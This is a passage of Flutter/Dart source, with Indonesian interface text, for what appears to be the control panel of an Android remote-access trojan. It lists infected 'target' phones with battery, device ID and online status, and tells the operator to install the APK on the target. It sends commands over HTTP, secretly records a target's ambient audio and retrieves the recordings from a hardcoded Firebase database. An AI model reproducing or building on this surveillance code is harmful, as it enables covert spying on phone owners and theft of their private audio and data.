                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: _searchExpanded
                      ? _accent.withOpacity(0.4)
                      : Colors.white10,
                ),
              ),
              child: Icon(
                _searchExpanded
                    ? Icons.search_off_rounded
                    : Icons.search_rounded,
                color: _searchExpanded ? _accent : _textS,
                size: 18,
              ),
            ),
          ),
          const SizedBox(width: 8),

          GestureDetector(
            onTap: () => _fetch(showLoading: true),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: _loading ? _accent.withOpacity(0.1) : _card2,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: _loading ? _accent.withOpacity(0.3) : Colors.white10,
                ),
              ),
              child: _loading
                  ? Padding(
                      padding: const EdgeInsets.all(10),
                      child: CircularProgressIndicator(
                        strokeWidth: 2.5,
                        color: _accent,
                        backgroundColor: _accent.withOpacity(0.2),
                      ),
                    )
                  : const Icon(Icons.refresh_rounded, color: _textS, size: 18),
            ),
          ),
        ],
      ),
    );
  }


  Widget _buildSearchBar() {
    return AnimatedSize(
      duration: const Duration(milliseconds: 250),
      curve: Curves.easeOutCubic,
      child: _searchExpanded
          ? Container(
              padding: const EdgeInsets.fromLTRB(14, 10, 14, 0),
              child: Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_card2, _card],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(18),
                  border: Border.all(color: _accent.withOpacity(0.18)),
                  boxShadow: [
                    BoxShadow(
                      color: _accent.withOpacity(0.06),
                      blurRadius: 18,
                      offset: const Offset(0, 8),
                    ),
                  ],
                ),
                child: Row(
                  children: [
                    const Padding(
                      padding: EdgeInsets.only(left: 14),
                      child: Icon(
                        Icons.phone_android_rounded,
                        color: _accent,
                        size: 17,
                      ),
                    ),
                    Expanded(
                      child: TextField(
                        controller: _searchCtrl,
                        focusNode: _searchFocus,
                        style: const TextStyle(color: _textP, fontSize: 13.5),
                        onChanged: (v) => setState(() => _q = v),
                        decoration: InputDecoration(
                          hintText: 'Cari berdasarkan merk / model HP...',
                          hintStyle: TextStyle(
                            color: _textS.withOpacity(0.6),
                            fontSize: 13,
                          ),
                          border: InputBorder.none,
                          contentPadding: const EdgeInsets.symmetric(
                            horizontal: 10,
                            vertical: 13,
                          ),
                        ),
                      ),
                    ),
                    if (_q.isNotEmpty)
                      GestureDetector(
                        onTap: () {
                          _searchCtrl.clear();
                          setState(() => _q = '');
                        },
                        child: const Padding(
                          padding: EdgeInsets.only(right: 12),
                          child: Icon(
                            Icons.cancel_rounded,
                            color: _textS,
                            size: 17,
                          ),
                        ),
                      ),
                    if (_q.isEmpty)
                      const Padding(
                        padding: EdgeInsets.only(right: 12),
                        child: Icon(
                          Icons.keyboard_rounded,
                          color: _textS,
                          size: 17,
                        ),
                      ),
                  ],
                ),
              ),
            )
          : const SizedBox.shrink(),
    );
  }


  Widget _buildStatRow() {
    if (_targets.isEmpty) return const SizedBox.shrink();
    final online = _onlineCount;
    final offline = _targets.length - online;
    final shown = _filtered.length;
    return Container(
      margin: const EdgeInsets.fromLTRB(14, 10, 14, 0),
      child: Row(
        children: [
          _statPill(
            Icons.devices_rounded,
            '${_targets.length}',
            'Total',
            const Color(0xFF4F8EF7),
          ),
          const SizedBox(width: 8),
          _statPill(
            Icons.circle_rounded,
            '$online',
            'Online',
            Colors.greenAccent,
          ),
          const SizedBox(width: 8),
          _statPill(
            Icons.power_settings_new_rounded,
            '$offline',
            'Offline',
            const Color(0xFFFF7043),
          ),
          const Spacer(),
          if (_q.isNotEmpty)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: _accent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _accent.withOpacity(0.25)),
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  const Icon(
                    Icons.filter_list_rounded,
                    color: _accent,
                    size: 12,
                  ),
                  const SizedBox(width: 4),
                  Text(
                    '$shown hasil',
                    style: const TextStyle(
                      color: _accent,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _statPill(IconData icon, String val, String label, Color color) =>
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 11, vertical: 7),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [color.withOpacity(0.18), color.withOpacity(0.06)],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: color.withOpacity(0.22)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: color, size: 11),
            const SizedBox(width: 5),
            Text(
              val,
              style: TextStyle(
                color: color,
                fontSize: 13,
                fontWeight: FontWeight.w700,
              ),
            ),
            const SizedBox(width: 3),
            Text(
              label,
              style: TextStyle(color: color.withOpacity(0.7), fontSize: 10),
            ),
          ],
        ),
      );


  Widget _buildBody() {
    if (_loading && _targets.isEmpty) return _buildLoadingView();
    if (_fetchErr != null && _targets.isEmpty)
      return _buildErrorView(_fetchErr!);
    if (_targets.isEmpty) return _buildEmptyView();

    final list = _filtered;
    if (list.isEmpty && _q.isNotEmpty) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Icon(Icons.search_off_rounded, color: _textS, size: 52),
            const SizedBox(height: 12),
            Text(
              'Tidak ditemukan: "$_q"',
              style: const TextStyle(color: _textS, fontSize: 14),
            ),
            const SizedBox(height: 6),
            const Text(
              'Coba kata kunci lain',
              style: TextStyle(color: _textS, fontSize: 12),
            ),
            const SizedBox(height: 16),
            TextButton.icon(
              onPressed: () {
                _searchCtrl.clear();
                setState(() => _q = '');
              },
              icon: const Icon(Icons.clear_rounded, size: 14, color: _accent),
              label: const Text(
                'Hapus Filter',
                style: TextStyle(color: _accent),
              ),
            ),
          ],
        ),
      );
    }

    return RefreshIndicator(
      onRefresh: () => _fetch(showLoading: true),
      color: _accent,
      backgroundColor: _card2,
      strokeWidth: 2,
      child: ListView.builder(
        padding: const EdgeInsets.fromLTRB(14, 14, 14, 20),
        itemCount: list.length,
        itemBuilder: (_, i) {
          final t = list[i];
          final realIdx = _targets.indexOf(t);
          return _TargetCard(
            target: t,
            index: realIdx,
            searchQuery: _q,
            onTap: () => Navigator.push(
              context,
              PageRouteBuilder(
                pageBuilder: (_, a, __) => CommandPage(target: t),
                transitionsBuilder: (_, a, __, child) => SlideTransition(
                  position: Tween(begin: const Offset(1, 0), end: Offset.zero)
                      .animate(
                        CurvedAnimation(parent: a, curve: Curves.easeOutCubic),
                      ),
                  child: child,
                ),
              ),
            ),
            onDelete: () =>
                _deleteTarget(t['device_id'], t['model'] ?? 'Unknown'),
          );
        },
      ),
    );
  }

  Widget _buildLoadingView() => Center(
    child: Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        AnimatedBuilder(
          animation: _pulse,
          builder: (_, __) => Stack(
            alignment: Alignment.center,
            children: [
              Container(
                width: 90,
                height: 90,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _accent.withOpacity(_pulse.value * 0.4),
                    width: 2,
                  ),
                ),
              ),
              Container(
                width: 68,
                height: 68,
                decoration: BoxDecoration(
                  color: _accent.withOpacity(0.07 + _pulse.value * 0.05),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _accent.withOpacity(0.3),
                    width: 1.5,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: _accent.withOpacity(_pulse.value * 0.25),
                      blurRadius: 20,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.radar_rounded,
                  color: _accent,
                  size: 32,
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 20),
        const Text(
          'Memuat perangkat...',
          style: TextStyle(
            color: _textP,
            fontSize: 14,
            fontWeight: FontWeight.w500,
          ),
        ),
        const SizedBox(height: 5),
        const Text(
          'Terhubung ke server',
          style: TextStyle(color: _textS, fontSize: 11),
        ),
      ],
    ),
  );

  Widget _buildErrorView(String err) => Center(
    child: Padding(
      padding: const EdgeInsets.all(32),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 76,
            height: 76,
            decoration: BoxDecoration(
              color: _accent.withOpacity(0.07),
              shape: BoxShape.circle,
              border: Border.all(color: _accent.withOpacity(0.25), width: 2),
            ),
            child: const Icon(
              Icons.cloud_off_rounded,
              color: _accent,
              size: 34,
            ),
          ),
          const SizedBox(height: 16),
          const Text(
            'Koneksi Gagal',
            style: TextStyle(
              color: _textP,
              fontSize: 17,
              fontWeight: FontWeight.w700,
            ),
          ),
          const SizedBox(height: 8),
          Text(
            err,
            textAlign: TextAlign.center,
            style: const TextStyle(color: _textS, fontSize: 12, height: 1.5),
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            onPressed: () => _fetch(showLoading: true),
            icon: const Icon(Icons.refresh_rounded, size: 16),
            label: const Text(
              'Coba Lagi',
              style: TextStyle(fontWeight: FontWeight.w600),
            ),
            style: ElevatedButton.styleFrom(
              backgroundColor: _accent,
              foregroundColor: Colors.white,
              padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 13),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(14),
              ),
              elevation: 0,
            ),
          ),
        ],
      ),
    ),
  );

  Widget _buildEmptyView() => Center(
    child: Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        Container(
          width: 80,
          height: 80,
          decoration: BoxDecoration(
            color: _card2,
            shape: BoxShape.circle,
            border: Border.all(color: _border),
          ),
          child: Icon(
            Icons.phone_android_rounded,
            color: _textS.withOpacity(0.3),
            size: 38,
          ),
        ),
        const SizedBox(height: 16),
        const Text(
          'Belum ada perangkat',
          style: TextStyle(
            color: _textP,
            fontSize: 15,
            fontWeight: FontWeight.w600,
          ),
        ),
        const SizedBox(height: 6),
        const Text(
          'Pasang APK pada target untuk memulai',
          style: TextStyle(color: _textS, fontSize: 12),
        ),
      ],
    ),
  );
}

class _TargetCard extends StatefulWidget {
  final Map<String, dynamic> target;
  final int index;
  final String searchQuery;
  final VoidCallback onTap;
  final VoidCallback onDelete;
  const _TargetCard({
    required this.target,
    required this.index,
    this.searchQuery = '',
    required this.onTap,
    required this.onDelete,
  });
  @override
  State<_TargetCard> createState() => _TargetCardState();
}

class _TargetCardState extends State<_TargetCard>
    with SingleTickerProviderStateMixin {
  late AnimationController _scaleCtrl;
  late Animation<double> _scaleAnim;

  static const _palette = [
    Color(0xFF4F8EF7),
    Color(0xFF33D399),
    Color(0xFF9B72F8),
    Color(0xFFFF8A50),
    Color(0xFFFF5FA0),
    Color(0xFF26C6DA),
  ];

  @override
  void initState() {
    super.initState();
    _scaleCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );
    _scaleAnim = Tween(
      begin: 1.0,
      end: 0.965,
    ).animate(CurvedAnimation(parent: _scaleCtrl, curve: Curves.easeIn));
  }

  @override
  void dispose() {
    _scaleCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final t = widget.target;
    final c = _palette[widget.index % _palette.length];
    final manufacturer = (t['manufacturer'] as String? ?? '').trim();
    final model = (t['model'] as String? ?? 'Unknown').trim();
    final fullModel = '$manufacturer $model'.trim();
    final sdk = t['sdk']?.toString() ?? '-';
    final android = t['android_version']?.toString() ?? '';
    final battery = t['battery']?.toString() ?? '';
    final deviceId = t['device_id']?.toString() ?? '-';
    final lastSeen = t['last_seen'] as DateTime?;
    final isOnline =
        lastSeen != null && DateTime.now().difference(lastSeen).inSeconds < 150;
    final statusColor = isOnline ? Colors.greenAccent : const Color(0xFFFF7043);

    String lastSeenStr = '';
    if (!isOnline && lastSeen != null) {
      final diff = DateTime.now().difference(lastSeen);
      if (diff.inSeconds < 60)
        lastSeenStr = 'baru saja';
      else if (diff.inMinutes < 60)
        lastSeenStr = '${diff.inMinutes}m lalu';
      else if (diff.inHours < 24)
        lastSeenStr = '${diff.inHours}j lalu';
      else
        lastSeenStr = '${diff.inDays}h lalu';
    }

    return GestureDetector(
      onTapDown: (_) => _scaleCtrl.forward(),
      onTapUp: (_) {
        _scaleCtrl.reverse();
        widget.onTap();
      },
      onTapCancel: () => _scaleCtrl.reverse(),
      child: ScaleTransition(
        scale: _scaleAnim,
        child: Container(
          margin: const EdgeInsets.only(bottom: 12),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [_card2, _card, const Color(0xFF0C1727)],
            ),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: isOnline
                  ? c.withOpacity(0.25)
                  : Colors.white.withOpacity(0.06),
              width: isOnline ? 1.5 : 1,
            ),
            boxShadow: [
              BoxShadow(
                color: c.withOpacity(isOnline ? 0.1 : 0.04),
                blurRadius: 24,
                offset: const Offset(0, 10),
              ),
              BoxShadow(
                color: Colors.black.withOpacity(0.18),
                blurRadius: 14,
                offset: const Offset(0, 6),
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: Stack(
              children: [
                Positioned(
                  top: -28,
                  right: -18,
                  child: Container(
                    width: 110,
                    height: 110,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(
                        colors: [
                          c.withOpacity(0.16),
                          c.withOpacity(0.05),
                          Colors.transparent,
                        ],
                      ),
                    ),
                  ),
                ),

                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: Container(
                    height: 3,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [
                          c.withOpacity(isOnline ? 0.9 : 0.3),
                          c.withOpacity(0),
                        ],
                      ),
                    ),
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.fromLTRB(14, 16, 14, 14),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [

                      Row(
                        children: [

                          Container(
                            width: 50,
                            height: 50,
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                colors: [
                                  c.withOpacity(0.22),
                                  c.withOpacity(0.05),
                                ],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              ),
                              borderRadius: BorderRadius.circular(15),
                              border: Border.all(color: c.withOpacity(0.25)),
                            ),
                            child: Stack(
                              alignment: Alignment.center,
                              children: [
                                Icon(
                                  Icons.phone_android_rounded,
                                  color: c,
                                  size: 24,
                                ),
                                if (isOnline)
                                  Positioned(
                                    right: 5,
                                    bottom: 5,
                                    child: Container(
                                      width: 8,
                                      height: 8,
                                      decoration: BoxDecoration(
                                        color: _success,
                                        shape: BoxShape.circle,
                                        border: Border.all(
                                          color: _card,
                                          width: 1.5,
                                        ),
                                        boxShadow: [
                                          BoxShadow(
                                            color: _success.withOpacity(0.5),
                                            blurRadius: 5,
                                          ),
                                        ],
                                      ),
                                    ),
                                  ),
                              ],
                            ),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [

                                _buildHighlightedText(
                                  fullModel,
                                  widget.searchQuery,
                                  c,
                                ),
                                const SizedBox(height: 3),
                                Row(
                                  children: [

                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 7,
                                        vertical: 2,
                                      ),
                                      decoration: BoxDecoration(
                                        color: statusColor.withOpacity(0.1),
                                        borderRadius: BorderRadius.circular(6),
                                        border: Border.all(
                                          color: statusColor.withOpacity(0.3),
                                        ),
                                      ),
                                      child: Row(
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          Container(
                                            width: 5,
                                            height: 5,
                                            decoration: BoxDecoration(
                                              color: statusColor,
                                              shape: BoxShape.circle,
                                            ),
                                          ),
                                          const SizedBox(width: 4),
                                          Text(
                                            isOnline
                                                ? 'Online'
                                                : lastSeenStr.isNotEmpty
                                                ? lastSeenStr
                                                : 'Offline',
                                            style: TextStyle(
                                              color: statusColor,
                                              fontSize: 9.5,
                                              fontWeight: FontWeight.w700,
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                    const SizedBox(width: 6),

                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 6,
                                        vertical: 2,
                                      ),
                                      decoration: BoxDecoration(
                                        color: _success.withOpacity(0.07),
                                        borderRadius: BorderRadius.circular(5),
                                      ),
                                      child: const Row(
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          Icon(
                                            Icons.http_rounded,
                                            size: 9,
                                            color: _success,
                                          ),
                                          SizedBox(width: 2),
                                          Text(
                                            'HTTP',
                                            style: TextStyle(
                                              color: _success,
                                              fontSize: 8,
                                              fontWeight: FontWeight.w700,
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                  ],
                                ),
                              ],
                            ),
                          ),

                          Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [

                              Container(
                                padding: const EdgeInsets.symmetric(
                                  horizontal: 12,
                                  vertical: 7,
                                ),
                                decoration: BoxDecoration(
                                  gradient: LinearGradient(
                                    colors: [
                                      c.withOpacity(0.22),
                                      c.withOpacity(0.08),
                                    ],
                                  ),
                                  borderRadius: BorderRadius.circular(10),
                                  border: Border.all(color: c.withOpacity(0.3)),
                                ),
                                child: Row(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    Icon(
                                      Icons.settings_remote_rounded,
                                      color: c,
                                      size: 13,
                                    ),
                                    const SizedBox(width: 4),
                                    Text(
                                      'Kontrol',
                                      style: TextStyle(
                                        color: c,
                                        fontSize: 10.5,
                                        fontWeight: FontWeight.w700,
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 6),

                              GestureDetector(
                                onTap: widget.onDelete,
                                child: Container(
                                  padding: const EdgeInsets.all(7),
                                  decoration: BoxDecoration(
                                    color: _danger.withOpacity(0.1),
                                    borderRadius: BorderRadius.circular(9),
                                    border: Border.all(
                                      color: _danger.withOpacity(0.24),
                                    ),
                                  ),
                                  child: const Icon(
                                    Icons.delete_outline_rounded,
                                    color: _danger,
                                    size: 14,
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                      const SizedBox(height: 12),


                      Container(
                        height: 1,
                        color: Colors.white.withOpacity(0.05),
                      ),
                      const SizedBox(height: 10),


                      Row(
                        children: [
                          _metaChip(Icons.layers_rounded, 'SDK $sdk', c),
                          const SizedBox(width: 6),
                          if (android.isNotEmpty) ...[
                            _metaChip(
                              Icons.android_rounded,
                              'Android $android',
                              const Color(0xFF34D399),
                            ),
                            const SizedBox(width: 6),
                          ],
                          if (battery.isNotEmpty) ...[
                            _metaChip(
                              _batteryIcon(battery),
                              '$battery%',
                              _batteryColor(battery),
                            ),
                            const SizedBox(width: 6),
                          ],
                          const Spacer(),

                          Container(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 7,
                              vertical: 3,
                            ),
                            decoration: BoxDecoration(
                              color: _card2,
                              borderRadius: BorderRadius.circular(6),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                const Icon(
                                  Icons.fingerprint_rounded,
                                  color: _textS,
                                  size: 10,
                                ),
                                const SizedBox(width: 4),
                                ConstrainedBox(
                                  constraints: const BoxConstraints(
                                    maxWidth: 100,
                                  ),
                                  child: Text(
                                    deviceId,
                                    style: const TextStyle(
                                      color: _textS,
                                      fontSize: 9,
                                      fontFamily: 'monospace',
                                    ),
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildHighlightedText(String text, String query, Color accentColor) {
    if (query.isEmpty) {
      return Text(
        text,
        style: const TextStyle(
          color: _textP,
          fontWeight: FontWeight.w700,
          fontSize: 15.5,
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      );
    }
    final lower = text.toLowerCase();
    final q = query.toLowerCase();
    final idx = lower.indexOf(q);
    if (idx < 0) {
      return Text(
        text,
        style: const TextStyle(
          color: _textP,
          fontWeight: FontWeight.w700,
          fontSize: 15.5,
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      );
    }
    return RichText(
      maxLines: 1,
      overflow: TextOverflow.ellipsis,
      text: TextSpan(
        children: [
          if (idx > 0)
            TextSpan(
              text: text.substring(0, idx),
              style: const TextStyle(
                color: _textP,
                fontWeight: FontWeight.w700,
                fontSize: 15.5,
              ),
            ),
          TextSpan(
            text: text.substring(idx, idx + query.length),
            style: TextStyle(
              color: accentColor,
              fontWeight: FontWeight.w800,
              fontSize: 15.5,
              backgroundColor: accentColor.withOpacity(0.12),
            ),
          ),
          if (idx + query.length < text.length)
            TextSpan(
              text: text.substring(idx + query.length),
              style: const TextStyle(
                color: _textP,
                fontWeight: FontWeight.w700,
                fontSize: 15.5,
              ),
            ),
        ],
      ),
    );
  }

  Widget _metaChip(IconData icon, String label, Color color) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
    decoration: BoxDecoration(
      color: color.withOpacity(0.08),
      borderRadius: BorderRadius.circular(7),
      border: Border.all(color: color.withOpacity(0.2)),
    ),
    child: Row(
      mainAxisSize: MainAxisSize.min,
      children: [
        Icon(icon, color: color, size: 10),
        const SizedBox(width: 4),
        Text(
          label,
          style: TextStyle(
            color: color,
            fontSize: 10,
            fontWeight: FontWeight.w600,
          ),
        ),
      ],
    ),
  );

  IconData _batteryIcon(String pct) {
    final v = int.tryParse(pct) ?? 50;
    if (v >= 80) return Icons.battery_full_rounded;
    if (v >= 50) return Icons.battery_4_bar_rounded;
    if (v >= 20) return Icons.battery_2_bar_rounded;
    return Icons.battery_alert_rounded;
  }

  Color _batteryColor(String pct) {
    final v = int.tryParse(pct) ?? 50;
    if (v >= 60) return const Color(0xFF34D399);
    if (v >= 30) return const Color(0xFFFBBF24);
    return const Color(0xFFFC8181);
  }
}




class CommandPage extends StatefulWidget {
  final Map<String, dynamic> target;
  const CommandPage({super.key, required this.target});
  @override
  State<CommandPage> createState() => _CommandPageState();
}

class _CommandPageState extends State<CommandPage>
    with TickerProviderStateMixin {
  bool _sending = false;
  String _statusMsg = '';
  bool _statusOk = true;
  late PageController _pageCtrl;
  int _currentPage = 0;
  StreamSubscription<Map<String, dynamic>>? _resultSub;


  bool _isRecording = false;
  Duration _recordDuration = Duration.zero;
  Timer? _recordTimer;

  String get deviceId => widget.target['device_id'] ?? '';
  String get deviceName =>
      '${widget.target['manufacturer'] ?? ''} ${widget.target['model'] ?? deviceId}'
          .trim();

  @override
  void initState() {
    super.initState();
    _pageCtrl = PageController();
  }

  @override
  void dispose() {
    _pageCtrl.dispose();
    _resultSub?.cancel();
    _recordTimer?.cancel();
    super.dispose();
  }

  Future<void> _showRecordAudioDialog(CommandItem cmd) async {
    bool isRecording = true;
    bool isUploading = false;
    String? audioLocalPath;
    String? audioUrl;
    int seconds = 0;
    Timer? timer;
    StreamSubscription? resultSub;
    AudioPlayer? player;
    bool isPlaying = false;


    final cmdId = await HttpService.sendCommand(deviceId, cmd.id, '');
    
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setModalState) {
          if (isRecording && timer == null) {
            timer = Timer.periodic(const Duration(seconds: 1), (t) {
              setModalState(() => seconds++);
            });
          }

          Widget _buildContent() {
            if (audioLocalPath != null || (audioUrl != null && audioUrl!.startsWith('http'))) {
              return Column(
                children: [
                  const Icon(Icons.check_circle_rounded, color: Colors.green, size: 48),
                  const SizedBox(height: 16),
                  const Text('Rekaman Selesai', style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 24),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      IconButton(
                        icon: Icon(isPlaying ? Icons.pause_circle_filled_rounded : Icons.play_circle_filled_rounded),
                        color: _accent,
                        iconSize: 64,
                        onPressed: () async {
                          if (isPlaying) {
                            await player?.pause();
                          } else {
                            if (player == null) {
                              player = AudioPlayer();
                              player!.onPlayerComplete.listen((_) {
                                setModalState(() => isPlaying = false);
                              });
                              if (audioLocalPath != null) {
                                await player!.setSource(DeviceFileSource(audioLocalPath!));
                              } else if (audioUrl != null) {
                                await player!.setSource(UrlSource(audioUrl!));
                              }
                            }
                            await player?.resume();
                          }
                          setModalState(() => isPlaying = !isPlaying);
                        },
                      ),
                    ],
                  ),
                  if (audioUrl != null) ...[
                    const SizedBox(height: 20),
                    ElevatedButton.icon(
                      onPressed: () {
                        Clipboard.setData(ClipboardData(text: audioUrl!));
                        ScaffoldMessenger.of(context).showSnackBar(
                          SnackBar(
                            content: const Text('Link disalin!'),
                            backgroundColor: Colors.greenAccent.withOpacity(0.85),
                            behavior: SnackBarBehavior.floating,
                            duration: const Duration(seconds: 1),
                          ),
                        );
                      },
                      icon: const Icon(Icons.copy_rounded),
                      label: const Text('Salin Link Audio'),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _card2,
                        foregroundColor: _textP,
                      ),
                    ),
                  ]
                ],
              );
            }

            if (isUploading) {
              return Column(
                children: [
                  const CircularProgressIndicator(color: _accent),
                  const SizedBox(height: 24),
                  const Text('Mengunggah Rekaman & Menunggu Hasil...', style: TextStyle(color: Colors.white)),
                ],
              );
            }

            return Column(
              children: [
                const Icon(Icons.mic_rounded, color: Colors.redAccent, size: 48),
                const SizedBox(height: 16),
                const Text('Sedang Merekam Suara Sekitar...', style: TextStyle(color: Colors.white, fontSize: 16)),
                const SizedBox(height: 8),
                Text('${(seconds ~/ 60).toString().padLeft(2, '0')}:${(seconds % 60).toString().padLeft(2, '0')}', style: const TextStyle(color: Colors.white54, fontSize: 32, fontWeight: FontWeight.w300)),
                const SizedBox(height: 32),
                ElevatedButton.icon(
                  onPressed: () async {
                    timer?.cancel();
                    setModalState(() {
                      isRecording = false;
                      isUploading = true;
                    });
                    await HttpService.sendCommand(deviceId, Cmd.recordAudioStop, '');
                    

                    final ref = FirebaseDatabase.instanceFor(
                      app: Firebase.app(),
                      databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/',
                    ).ref('results/$deviceId/$cmdId');
                    
                    resultSub = ref.onValue.listen((event) async {
                      if (event.snapshot.exists) {
                        final data = event.snapshot.value;
                        if (data is Map && data['type'] == 'record_audio' && data['data'] != null) {
                          try {
                            String dataString = data['data'].toString().trim();
                            
                            if (dataString.startsWith('http')) {
                              setModalState(() {
                                isUploading = false;
                                audioUrl = dataString;
                              });
                            } else {
                              Uint8List bytes = base64Decode(dataString);
                              final dir = await getTemporaryDirectory();
                              File tempFile = File('${dir.path}/temp_audio_$cmdId.amr');
                              await tempFile.writeAsBytes(bytes);
                              
                              setModalState(() {
                                isUploading = false;
                                audioLocalPath = tempFile.path;
                              });
                            }
                          } catch (e) {
                            print("Gagal decode data audio: $e");
                            setModalState(() {
                              isUploading = false;
                            });
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(content: Text('Gagal proses audio: $e')),
                            );
                          }
                          resultSub?.cancel();
                        }
                      }
                    });
                  },
                  icon: const Icon(Icons.stop_rounded),
                  label: const Text('Stop Rekaman', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.redAccent,
                    foregroundColor: Colors.white,
                    minimumSize: const Size(double.infinity, 54),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                  ),
                ),
              ],
            );
          }

          return Padding(
            padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
            child: Container(
              decoration: const BoxDecoration(
                color: _card,
                borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
              ),
              padding: const EdgeInsets.fromLTRB(24, 32, 24, 40),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    width: 40,
                    height: 4,
                    decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2)),
                  ),
                  const SizedBox(height: 32),
                  _buildContent(),
                ],
              ),
            ),
          );
        },
      ),
    ).whenComplete(() {
      timer?.cancel();
      resultSub?.cancel();
      player?.dispose();
    });
  }

  Future<void> _showSendVoiceDialog(CommandItem cmd) async {
    final urlCtrl = TextEditingController();
    bool uploading = false;
    bool isRecording = false;
    int recordSeconds = 0;
    Timer? recordTimer;
    final audioRecorder = AudioRecorder();

    Future<String?> _pickAudioAndUpload(StateSetter setModalState) async {
      FilePickerResult? result = await FilePicker.platform.pickFiles(
        type: FileType.audio,
      );
      if (result != null && result.files.single.path != null) {
        setModalState(() => uploading = true);
        try {
          String? uploadedUrl = await HttpService.uploadFile(
            result.files.single.path!,
          );
          if (uploadedUrl != null) {
            return '$baseUrl$uploadedUrl';
          } else {
            throw Exception('Upload gagal');
          }
        } catch (e) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('Upload gagal: $e'),
              backgroundColor: Colors.red,
            ),
          );
          return null;
        } finally {
          setModalState(() => uploading = false);
        }
      }
      return null;
    }

    Future<void> _startRecording(StateSetter setModalState) async {
      try {
        if (await audioRecorder.hasPermission()) {
          final dir = await getTemporaryDirectory();
          final path =
              '${dir.path}/voice_${DateTime.now().millisecondsSinceEpoch}.m4a';
          await audioRecorder.start(
            const RecordConfig(encoder: AudioEncoder.aacLc),
            path: path,
          );
          setModalState(() {
            isRecording = true;
            recordSeconds = 0;
          });
          recordTimer = Timer.periodic(const Duration(seconds: 1), (Timer t) {
            setModalState(() {
              recordSeconds++;
